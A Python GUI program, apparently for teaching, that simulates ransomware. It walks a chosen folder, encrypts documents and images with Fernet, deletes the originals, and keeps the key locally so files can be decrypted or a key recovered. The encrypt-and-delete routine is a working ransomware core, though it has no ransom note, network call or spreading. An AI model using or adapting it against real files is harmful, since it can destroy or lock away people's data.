import os
import base64
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.salt = os.urandom(16)
        self.fernet = None
        self.encrypted_files = []
        self.target_extensions = ['.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.png']
        
    def generate_key(self, password):
        """Generate encryption key from password and salt"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
        
    def init_encryption(self, password):
        """Initialize encryption with provided password"""
        self.key = self.generate_key(password)
        self.fernet = Fernet(self.key)
        return self.key, self.salt
        
    def encrypt_file(self, file_path):
        """Encrypt a single file"""
        try:
            # Read file content
            with open(file_path, 'rb') as file:
                file_data = file.read()
                
            # Encrypt data
            encrypted_data = self.fernet.encrypt(file_data)
            
            # Write encrypted data back
            encrypted_path = file_path + '.encrypted'
            with open(encrypted_path, 'wb') as file:
                file.write(encrypted_data)
                
            # Store original path for later recovery
            self.encrypted_files.append((file_path, encrypted_path))
            
            # Remove original file
            os.remove(file_path)
            return True
        except Exception as e:
            print(f"Error encrypting {file_path}: {str(e)}")
            return False
    
    def encrypt_directory(self, directory_path):
        """Encrypt all target files in a directory"""
        encrypted_count = 0
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                _, ext = os.path.splitext(file_path)
                if ext.lower() in self.target_extensions and not file_path.endswith('.encrypted'):
                    if self.encrypt_file(file_path):
                        encrypted_count += 1
        return encrypted_count
    
    def decrypt_file(self, encrypted_file_path, key=None):
        """Decrypt a single file"""
        if key:
            # Use provided key
            fernet = Fernet(key)
        else:
            # Use stored key
            fernet = self.fernet
            
        try:
            # Read encrypted data
            with open(encrypted_file_path, 'rb') as file:
                encrypted_data = file.read()
                
            # Decrypt data
            decrypted_data = fernet.decrypt(encrypted_data)
            
            # Write decrypted data
            original_path = encrypted_file_path.replace('.encrypted', '')
            with open(original_path, 'wb') as file:
                file.write(decrypted_data)
                
            # Remove encrypted file
            os.remove(encrypted_file_path)
            return True
        except Exception as e:
            print(f"Error decrypting {encrypted_file_path}: {str(e)}")
            return False
    
    def decrypt_directory(self, directory_path, key=None):
        """Decrypt all encrypted files in a directory"""
        decrypted_count = 0
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.endswith('.encrypted'):
                    if self.decrypt_file(file_path, key):
                        decrypted_count += 1
        return decrypted_count
    
    def save_key_to_file(self, file_path):
        """Save encryption key and salt to file for recovery"""
        with open(file_path, 'wb') as f:
            f.write(self.key + b'\n' + self.salt)
    
    def load_key_from_file(self, file_path):
        """Load encryption key and salt from file"""
        with open(file_path, 'rb') as f:
            data = f.read().split(b'\n')
            if len(data) >= 2:
                self.key = data[0]
                self.salt = data[1]
                self.fernet = Fernet(self.key)
                return True
        return False
    
    def generate_recovery_key(self, file_path, password):
        """Generate a recovery key based on the encrypted file and the password"""
        try:
            with open(file_path, 'rb') as f:
                sample_data = f.read(128)  # Read a sample of the encrypted file
                
            # Attempt to extract information about the encryption
            for i in range(100000, 100100):  # Try different iteration counts
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=self.salt,
                    iterations=i,
                )
                potential_key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
                
                try:
                    fernet = Fernet(potential_key)
                    fernet.decrypt(sample_data)
                    return potential_key  # Found a working key
                except:
                    continue
                    
            return None  # Couldn't find a working key
        except:
            return None

class RansomwareSimulatorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ransomware Simulator & Decryption Tool")
        self.root.geometry("700x500")
        self.root.resizable(True, True)
        
        self.simulator = RansomwareSimulator()
        self.setup_ui()
        
    def setup_ui(self):
        # Create notebook (tabs)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Create tabs
        self.simulation_tab = ttk.Frame(self.notebook)
        self.decryption_tab = ttk.Frame(self.notebook)
        self.recovery_tab = ttk.Frame(self.notebook)
        self.about_tab = ttk.Frame(self.notebook)
        
        self.notebook.add(self.simulation_tab, text="Simulation")
        self.notebook.add(self.decryption_tab, text="Decryption")
        self.notebook.add(self.recovery_tab, text="Key Recovery")
        self.notebook.add(self.about_tab, text="About")
        
        # Setup simulation tab
        self.setup_simulation_tab()
        
        # Setup decryption tab
        self.setup_decryption_tab()
        
        # Setup recovery tab
        self.setup_recovery_tab()
        
        # Setup about tab
        self.setup_about_tab()
        
    def setup_simulation_tab(self):
        frame = ttk.LabelFrame(self.simulation_tab, text="Ransomware Simulation")
        frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Password entry
        ttk.Label(frame, text="Enter encryption password:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.password_var = tk.StringVar()
        self.password_entry = ttk.Entry(frame, textvariable=self.password_var, show="*")
        self.password_entry.grid(row=0, column=1, padx=5, pady=5, sticky='we')
        
        # Target directory
        ttk.Label(frame, text="Target Directory:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.target_dir_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.target_dir_var).grid(row=1, column=1, padx=5, pady=5, sticky='we')
        ttk.Button(frame, text="Browse", command=self.browse_target_dir).grid(row=1, column=2, padx=5, pady=5)
        
        # Save key file
        ttk.Label(frame, text="Save Key File:").grid(row=2, column=0, padx=5, pady=5, sticky='w')
        self.key_file_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.key_file_var).grid(row=2, column=1, padx=5, pady=5, sticky='we')
        ttk.Button(frame, text="Browse", command=self.browse_key_file).grid(row=2, column=2, padx=5, pady=5)
        
        # File types to encrypt
        ttk.Label(frame, text="File Extensions:").grid(row=3, column=0, padx=5, pady=5, sticky='w')
        self.extensions_var = tk.StringVar(value=", ".join(self.simulator.target_extensions))
        ttk.Entry(frame, textvariable=self.extensions_var).grid(row=3, column=1, columnspan=2, padx=5, pady=5, sticky='we')
        
        # Execute button
        ttk.Button(frame, text="Start Simulation", command=self.start_simulation).grid(row=4, column=0, columnspan=3, padx=5, pady=20)
        
        # Status
        self.status_var = tk.StringVar(value="Ready")
        ttk.Label(frame, textvariable=self.status_var).grid(row=5, column=0, columnspan=3, padx=5, pady=5)
        
        # Progress bar
        self.progress = ttk.Progressbar(frame, orient=tk.HORIZONTAL, length=200, mode='indeterminate')
        self.progress.grid(row=6, column=0, columnspan=3, padx=5, pady=5, sticky='we')
        
        # Configure grid weights
        frame.columnconfigure(1, weight=1)
        
    def setup_decryption_tab(self):
        frame = ttk.LabelFrame(self.decryption_tab, text="Decrypt Files")
        frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Encrypted directory
        ttk.Label(frame, text="Encrypted Directory:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.encrypted_dir_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.encrypted_dir_var).grid(row=0, column=1, padx=5, pady=5, sticky='we')
        ttk.Button(frame, text="Browse", command=self.browse_encrypted_dir).grid(row=0, column=2, padx=5, pady=5)
        
        # Key file
        ttk.Label(frame, text="Key File:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.decrypt_key_file_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.decrypt_key_file_var).grid(row=1, column=1, padx=5, pady=5, sticky='we')
        ttk.Button(frame, text="Browse", command=self.browse_decrypt_key_file).grid(row=1, column=2, padx=5, pady=5)
        
        # Decrypt button
        ttk.Button(frame, text="Decrypt Files", command=self.decrypt_files).grid(row=2, column=0, columnspan=3, padx=5, pady=20)
        
        # Status
        self.decrypt_status_var = tk.StringVar(value="Ready")
        ttk.Label(frame, textvariable=self.decrypt_status_var).grid(row=3, column=0, columnspan=3, padx=5, pady=5)
        
        # Progress bar
        self.decrypt_progress = ttk.Progressbar(frame, orient=tk.HORIZONTAL, length=200, mode='indeterminate')
        self.decrypt_progress.grid(row=4, column=0, columnspan=3, padx=5, pady=5, sticky='we')
        
        # Configure grid weights
        frame.columnconfigure(1, weight=1)
        
    def setup_recovery_tab(self):
        frame = ttk.LabelFrame(self.recovery_tab, text="Key Recovery Tool")
        frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Sample encrypted file
        ttk.Label(frame, text="Sample Encrypted File:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.sample_file_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.sample_file_var).grid(row=0, column=1, padx=5, pady=5, sticky='we')
        ttk.Button(frame, text="Browse", command=self.browse_sample_file).grid(row=0, column=2, padx=5, pady=5)
        
        # Password used
        ttk.Label(frame, text="Original Password (if known):").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.recovery_password_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.recovery_password_var).grid(row=1, column=1, padx=5, pady=5, sticky='we')
        
        # Salt value (if known)
        ttk.Label(frame, text="Salt Value (if known, hex):").grid(row=2, column=0, padx=5, pady=5, sticky='w')
        self.salt_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.salt_var).grid(row=2, column=1, padx=5, pady=5, sticky='we')
        
        # Save recovered key
        ttk.Label(frame, text="Save Recovered Key To:").grid(row=3, column=0, padx=5, pady=5, sticky='w')
        self.recovered_key_file_var = tk.StringVar()
        ttk.Entry(frame, textvariable=self.recovered_key_file_var).grid(row=3, column=1, padx=5, pady=5, sticky='we')
        ttk.Button(frame, text="Browse", command=self.browse_recovered_key_file).grid(row=3, column=2, padx=5, pady=5)
        
        # Recovery button
        ttk.Button(frame, text="Attempt Key Recovery", command=self.recover_key).grid(row=4, column=0, columnspan=3, padx=5, pady=20)
        
        # Status
        self.recovery_status_var = tk.StringVar(value="Ready")
        ttk.Label(frame, textvariable=self.recovery_status_var).grid(row=5, column=0, columnspan=3, padx=5, pady=5)
        
        # Progress bar
        self.recovery_progress = ttk.Progressbar(frame, orient=tk.HORIZONTAL, length=200, mode='indeterminate')
        self.recovery_progress.grid(row=6, column=0, columnspan=3, padx=5, pady=5, sticky='we')
        
        # Configure grid weights
        frame.columnconfigure(1, weight=1)
        
    def setup_about_tab(self):
        frame = ttk.Frame(self.about_tab)
        frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        about_text = """
        Ransomware Simulation & Decryption Tool
        
        This application is designed for educational purposes only to demonstrate how ransomware works and how files can be decrypted.
        
        Features:
        - Simulates ransomware encryption on a test directory
        - Demonstrates secure key generation
        - Provides decryption tools
        - Includes a key recovery module
        
        WARNING: This tool should only be used in controlled environments with test files.
        Never use on important data or production systems.
        
        Learning outcomes:
        - Understanding encryption/decryption techniques
        - File system operations
        - Cryptography fundamentals
        - Ransomware prevention tactics
        """
        
        text_widget = tk.Text(frame, wrap=tk.WORD, height=20)
        text_widget.pack(fill='both', expand=True)
        text_widget.insert(tk.END, about_text)
        text_widget.config(state=tk.DISABLED)
        
    # Helper functions
    def browse_target_dir(self):
        directory = filedialog.askdirectory(title="Select Target Directory")
        if directory:
            self.target_dir_var.set(directory)
            
    def browse_key_file(self):
        file_path = filedialog.asksaveasfilename(
            title="Save Key File",
            defaultextension=".key",
            filetypes=[("Key files", "*.key"), ("All files", "*.*")]
        )
        if file_path:
            self.key_file_var.set(file_path)
            
    def browse_encrypted_dir(self):
        directory = filedialog.askdirectory(title="Select Encrypted Directory")
        if directory:
            self.encrypted_dir_var.set(directory)
            
    def browse_decrypt_key_file(self):
        file_path = filedialog.askopenfilename(
            title="Select Key File",
            defaultextension=".key",
            filetypes=[("Key files", "*.key"), ("All files", "*.*")]
        )
        if file_path:
            self.decrypt_key_file_var.set(file_path)
            
    def browse_sample_file(self):
        file_path = filedialog.askopenfilename(
            title="Select Sample Encrypted File",
            filetypes=[("Encrypted files", "*.encrypted"), ("All files", "*.*")]
        )
        if file_path:
            self.sample_file_var.set(file_path)
            
    def browse_recovered_key_file(self):
        file_path = filedialog.asksaveasfilename(
            title="Save Recovered Key File",
            defaultextension=".key",
            filetypes=[("Key files", "*.key"), ("All files", "*.*")]
        )
        if file_path:
            self.recovered_key_file_var.set(file_path)
            
    # Action functions
    def start_simulation(self):
        password = self.password_var.get()
        target_dir = self.target_dir_var.get()
        key_file = self.key_file_var.get()
        extensions = self.extensions_var.get().split(',')
        
        if not password or not target_dir or not key_file:
            messagebox.showerror("Error", "Please fill in all required fields")
            return
            
        # Update extensions list
        self.simulator.target_extensions = [ext.strip() for ext in extensions]
        
        # Start progress bar
        self.progress.start()
        self.status_var.set("Encrypting files...")
        
        # Initialize encryption
        key, salt = self.simulator.init_encryption(password)
        
        # Run encryption in a separate thread to not block UI
        import threading
        def encrypt_thread():
            try:
                # Encrypt directory
                count = self.simulator.encrypt_directory(target_dir)
                
                # Save key
                self.simulator.save_key_to_file(key_file)
                
                # Update UI
                self.root.after(0, lambda: self.progress.stop())
                self.root.after(0, lambda: self.status_var.set(f"Encryption complete. {count} files encrypted. Key saved."))
                self.root.after(0, lambda: messagebox.showinfo("Simulation Complete", 
                    f"Encrypted {count} files in {target_dir}.\nKey saved to {key_file}.\n\nIMPORTANT: Keep this key safe to decrypt your files later!"))
            except Exception as e:
                self.root.after(0, lambda: self.progress.stop())
                self.root.after(0, lambda: self.status_var.set(f"Error: {str(e)}"))
                self.root.after(0, lambda: messagebox.showerror("Error", str(e)))
                
        thread = threading.Thread(target=encrypt_thread)
        thread.daemon = True
        thread.start()
        
    def decrypt_files(self):
        encrypted_dir = self.encrypted_dir_var.get()
        key_file = self.decrypt_key_file_var.get()
        
        if not encrypted_dir or not key_file:
            messagebox.showerror("Error", "Please fill in all required fields")
            return
            
        # Start progress bar
        self.decrypt_progress.start()
        self.decrypt_status_var.set("Loading key and decrypting files...")
        
        # Run decryption in a separate thread
        import threading
        def decrypt_thread():
            try:
                # Load key
                if not self.simulator.load_key_from_file(key_file):
                    raise Exception("Invalid key file")
                    
                # Decrypt files
                count = self.simulator.decrypt_directory(encrypted_dir)
                
                # Update UI
                self.root.after(0, lambda: self.decrypt_progress.stop())
                self.root.after(0, lambda: self.decrypt_status_var.set(f"Decryption complete. {count} files restored."))
                self.root.after(0, lambda: messagebox.showinfo("Decryption Complete", 
                    f"Successfully decrypted {count} files in {encrypted_dir}."))
            except Exception as e:
                self.root.after(0, lambda: self.decrypt_progress.stop())
                self.root.after(0, lambda: self.decrypt_status_var.set(f"Error: {str(e)}"))
                self.root.after(0, lambda: messagebox.showerror("Error", str(e)))
                
        thread = threading.Thread(target=decrypt_thread)
        thread.daemon = True
        thread.start()
        
    def recover_key(self):
        sample_file = self.sample_file_var.get()
        password = self.recovery_password_var.get()
        salt_hex = self.salt_var.get()
        recovery_file = self.recovered_key_file_var.get()
        
        if not sample_file or not recovery_file:
            messagebox.showerror("Error", "Please provide a sample encrypted file and recovery key path")
            return
            
        if not password and not salt_hex:
            messagebox.showerror("Error", "Please provide either a password or salt value")
            return
            
        # Start progress bar
        self.recovery_progress.start()
        self.recovery_status_var.set("Attempting key recovery...")
        
        # Run recovery in a separate thread
        import threading
        def recovery_thread():
            try:
                # Set salt if provided
                if salt_hex:
                    try:
                        self.simulator.salt = bytes.fromhex(salt_hex)
                    except:
                        raise Exception("Invalid salt hex value")
                
                # Generate recovery key
                key = self.simulator.generate_recovery_key(sample_file, password)
                
                if key:
                    # Save recovered key
                    with open(recovery_file, 'wb') as f:
                        f.write(key + b'\n' + self.simulator.salt)
                        
                    # Update UI
                    self.root.after(0, lambda: self.recovery_progress.stop())
                    self.root.after(0, lambda: self.recovery_status_var.set("Key recovered successfully!"))
                    self.root.after(0, lambda: messagebox.showinfo("Recovery Complete", 
                        f"Successfully recovered decryption key.\nSaved to {recovery_file}"))
                else:
                    # Update UI with failure
                    self.root.after(0, lambda: self.recovery_progress.stop())
                    self.root.after(0, lambda: self.recovery_status_var.set("Failed to recover key"))
                    self.root.after(0, lambda: messagebox.showerror("Recovery Failed", 
                        "Could not recover the decryption key with the provided information."))
            except Exception as e:
                self.root.after(0, lambda: self.recovery_progress.stop())
                self.root.after(0, lambda: self.recovery_status_var.set(f"Error: {str(e)}"))
                self.root.after(0, lambda: messagebox.showerror("Error", str(e)))
                
        thread = threading.Thread(target=recovery_thread)
        thread.daemon = True
        thread.start()

# Main function to run the application
def main():
    root = tk.Tk()
    app = RansomwareSimulatorGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()